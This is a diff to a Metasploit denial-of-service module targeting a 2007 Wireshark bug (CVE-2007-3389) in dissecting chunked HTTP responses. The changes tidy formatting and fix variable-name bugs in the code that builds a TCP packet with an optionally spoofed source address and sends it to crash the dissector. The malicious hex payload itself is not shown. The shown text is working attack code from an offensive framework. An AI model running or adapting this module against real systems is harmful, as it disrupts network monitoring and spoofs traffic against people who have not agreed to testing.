@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Capture
   include Msf::Auxiliary::Dos
 
@@ -17,20 +14,20 @@ class MetasploitModule < Msf::Auxiliary
         Wireshark crash when dissecting an HTTP chunked response.
         Versions affected: 0.99.5 (Bug 1394)
       },
-      'Author' 	=> [ 'Matteo Cantoni <goony[at]nothink.org>' ],
+      'Author' 	=> ['Matteo Cantoni <goony[at]nothink.org>'],
       'License'       => MSF_LICENSE,
       'References'    =>
         [
-          [ 'CVE', '2007-3389'],
-          [ 'OSVDB', '37643'],
-          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=1394'],
+          ['CVE', '2007-3389'],
+          ['OSVDB', '37643'],
+          ['URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=1394'],
         ],
       'DisclosureDate' => 'Feb 22 2007'))
 
     register_options([
       OptInt.new('SPORT', [true, 'The source port used to send the malicious HTTP response', 80]),
       OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
-    ], self.class)
+    ])
 
     deregister_options('FILTER','PCAPFILE')
   end
@@ -42,13 +39,13 @@ class MetasploitModule < Msf::Auxiliary
 
     p = PacketFu::TCPPacket.new
     p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
-    p.ip_daddr = dhost
+    p.ip_daddr = rhost
     p.tcp_dport = rand(65535)+1
-    n.tcp_ack = rand(0x100000000)
+    p.tcp_ack = rand(0x100000000)
     p.tcp_flags.psh = 1
     p.tcp_flags.ack = 1
     p.tcp_sport = datastore['SPORT'].to_i
-    p.tcp_window = 3072
+    p.tcp_win = 3072
 
     # The following hex blob contains an HTTP response with a chunked-encoding
     # length of 0. The ASCII version is below in a block comment.
